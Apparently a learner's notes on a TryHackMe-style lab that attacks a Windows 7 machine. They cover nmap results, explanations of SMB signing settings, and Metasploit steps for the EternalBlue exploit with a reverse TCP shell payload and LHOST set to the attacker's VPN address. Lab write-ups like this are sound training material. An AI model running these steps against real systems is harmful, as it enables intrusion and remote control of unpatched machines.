## Reconnaissance 
- Did nmap search , nmap -T4 -p- -A -sV -sC 10.65.171.129 the result:
	- PORT      STATE    SERVICE       VERSION
		135/tcp   open     msrpc         Microsoft Windows RPC
		139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
		445/tcp   open     microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
		3389/tcp  open     ms-wbt-server Microsoft Terminal Service
	- smb2-security-mode: 
		 2.1: 
		  Message signing enabled but not required
		  smb-os-discovery: 
		  OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
	
	- smb-security-mode: 
		account_used: guest
		authentication_level: user
	    challenge_response: supported
		message_signing: disabled (dangerous, but default)
	- what does authentication_level:user means?
		- **What it means:** The system requires a valid username and password to access shared resources .
		- **Why it matters:** It's the standard configuration for Windows and is more secure than "share-level" authentication (where a single password protects a resource).
	- What does challenge_signing: supported means?
		- This means the system supports the older **NTLM authentication** protocol .
	- What does message_signing: disabled means?
		- **What it is:** Message signing is a security feature that cryptographically signs each SMB packet to prevent **man-in-the-middle (MITM) attacks**.
	- **Why it's dangerous:** Because signing is disabled, an attacker on the same network can intercept and modify SMB traffic between the client and server without being detected. This opens the door to attacks like **SMB Relay Attacks** .
## Gaining Access 
- Result from Metasploit:
	- 10.65.145.134:445     - SMB Detected (versions: 1, 2) (preferred dialect: SMB 2.1) (signatures: optional) (uptime: 13s) (guid: {952e42ba-5e5b-4f34-8171-83014f1470f3}) (authentication domain: JON-PC)
	- found on an exploit : exploit/windows/smb/ms17_010_eternalblue
		- auxiliary(scanner/smb/smb_version) > use 0
		- No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
		- by default the payload was windows/x64/meterpreter/reverse_tcp.
		- that didn't work so had to change to set payload windows/x64/shell/reverse_tcp.
		- after that had to change the rhost but didn't change the **LHOST which was my wifi ip and because of that error was occuring. Had to change he LHOST to the THM VPN ip to make it work.**.
		- 